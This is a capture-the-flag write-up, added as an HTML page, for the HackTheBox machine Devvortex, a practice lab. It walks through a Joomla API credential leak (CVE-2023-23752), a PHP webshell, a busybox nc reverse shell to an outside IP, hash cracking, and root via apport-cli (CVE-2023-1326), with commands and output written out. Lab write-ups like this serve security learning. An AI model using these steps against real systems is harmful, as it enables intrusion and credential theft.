@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/devvortex.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Devvortex - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Devvortex</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Devvortex</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">joomla cve-2023-23752 info disclosure</span>
+                    <span class="tag">joomla template rce</span>
+                    <span class="tag">bcrypt crack</span>
+                    <span class="tag">apport-cli sudo lpe</span>
+                </div>
+
+                <img src="../../images/hackthebox/devvortex/index.png" alt="Devvortex Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Only 22 and 80 are open, an nginx site on Ubuntu.</p>
+
+                <pre><code>[devvortex] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -oN nmap devvortex.htb
+Nmap scan report for devvortex.htb (10.129.58.2)
+Host is up (0.15s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: DevVortex
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The site on port 80 is a static marketing page for "DevVortex" and points at <code>devvortex.htb</code>, so I added it to <code>/etc/hosts</code>. There is nothing exploitable on the surface, so the next move is to fuzz virtual hosts, which turns up one live subdomain, <code>dev.devvortex.htb</code>.</p>
+
+                <p>After adding that to <code>/etc/hosts</code>, content discovery on the subdomain gives away the stack. <code>/htaccess.txt</code> and <code>/administrator/</code> are the Joomla defaults, and <code>/README.txt</code> pins the version to the <strong>4.2.x</strong> branch.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>Joomla 4.2.x is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2023-23752">CVE-2023-23752</a> (<a href="https://www.exploit-db.com/exploits/51334">EDB-51334</a>), an improper access check on the Web Services API. Appending <code>?public=true</code> to the REST endpoints bypasses authentication and leaks the site configuration, database credentials included.</p>
+
+                <p>The users endpoint enumerates the accounts, showing <code>lewis</code> is a Super User:</p>
+
+                <pre><code>[devvortex] curl -s 'http://dev.devvortex.htb/api/index.php/v1/users?public=true'
+...
+"name": "lewis", "username": "lewis", "email": "lewis@devvortex.htb",
+"group_names": "Super Users"
+...
+"name": "logan paul", "username": "logan", "email": "logan@devvortex.htb",
+"group_names": "Registered"</code></pre>
+
+                <p>The application config endpoint is the real prize, it returns the MySQL credentials in cleartext:</p>
+
+                <pre><code>[devvortex] curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true'
+...
+"user": "lewis"
+...
+"password": "P4ntherg0t1n5r3c0n##"
+...
+"db": "joomla", "dbprefix": "sd4fg_"</code></pre>
+
+                <p>The password does not work over SSH, but it does log <code>lewis</code> straight into the Joomla administrator console. With Super User access, the classic Joomla foothold is the template editor: it lets an admin edit raw PHP files served by the site. I opened the <strong>Cassiopeia</strong> template and dropped a one line webshell into <code>shell.php</code>:</p>
+
+                <pre><code>&lt;?php system($_GET['0']);?&gt;</code></pre>
+
+                <p>The file is now served from the template directory, so it executes commands directly:</p>
+
+                <pre><code>[devvortex] curl 'http://dev.devvortex.htb/templates/cassiopeia/shell.php?0=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <p>Start a listener and trigger a <code>busybox nc</code> reverse shell through the same parameter:</p>
+
+                <pre><code>[devvortex] curl 'http://dev.devvortex.htb/templates/cassiopeia/shell.php?0=busybox%20nc%2010.10.15.108%204444%20-e%20/bin/bash'</code></pre>
+
+                <pre><code>[devvortex] nc -lvnp 4444
+www-data@devvortex:/var$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Foothold as <code>www-data</code>. <code>/etc/passwd</code> shows one regular user, <code>logan</code> (uid 1000), so that is the pivot target. The database password from the config leak still belongs to <code>lewis</code>, and MySQL is listening locally, so I logged into the Joomla database and dumped the users table:</p>
+
+                <pre><code>www-data@devvortex:/var$ mysql -u lewis -p
+Enter password: P4ntherg0t1n5r3c0n##
+
+mysql&gt; select username,password from joomla.sd4fg_users;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
++----------+--------------------------------------------------------------+</code></pre>
+
+                <p><code>logan</code>'s bcrypt hash cracks in seconds against <code>rockyou.txt</code>:</p>
+
+                <pre><code>[devvortex] hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
+$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho</code></pre>
+
+                <p>That password reuses for the system account, so this is a straight SSH login to the user flag:</p>
+
+                <pre><code>[devvortex] ssh logan@devvortex.htb
+logan@devvortex:~$ id
+uid=1000(logan) gid=1000(logan) groups=1000(logan)
+logan@devvortex:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Checking <code>sudo</code> rights for <code>logan</code> shows one allowed command:</p>
+
+                <pre><code>logan@devvortex:~$ sudo -l
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli</code></pre>
+
+                <p><code>apport-cli</code> is Ubuntu's crash reporting tool, and it is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2023-1326">CVE-2023-1326</a>. When it displays a crash report it pipes the output through a pager (<code>less</code>), and because we run it via <code>sudo</code> that pager runs as root. Pagers let you shell out with <code>!</code>, so from inside the report viewer we can execute an arbitrary command as root.</p>
+
+                <p>First create an empty crash file so <code>apport-cli</code> has something to open, then run it against that file and choose the option to view the report:</p>
+
+                <pre><code>logan@devvortex:~$ touch /var/crash/xxx.crash
+logan@devvortex:~$ sudo apport-cli -c /var/crash/xxx.crash</code></pre>
+
+                <p>At the prompt pick <code>(V)iew report</code>. That drops into <code>less</code> running as root. From the pager, escape to a command and set the SUID bit on <code>/bin/bash</code>:</p>
+
+                <pre><code>!chmod u+s /bin/bash</code></pre>
+
+                <p>Quit the pager and <code>/bin/bash</code> is now SUID root, so <code>bash -p</code> gives a root shell:</p>
+
+                <pre><code>logan@devvortex:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+logan@devvortex:~$ bash -p
+bash-5.0# id
+uid=1000(logan) gid=1000(logan) euid=0(root) groups=1000(logan)</code></pre>
+
+                <p>With an effective UID of 0 it is just reading <code>/root/root.txt</code>.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Devvortex</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
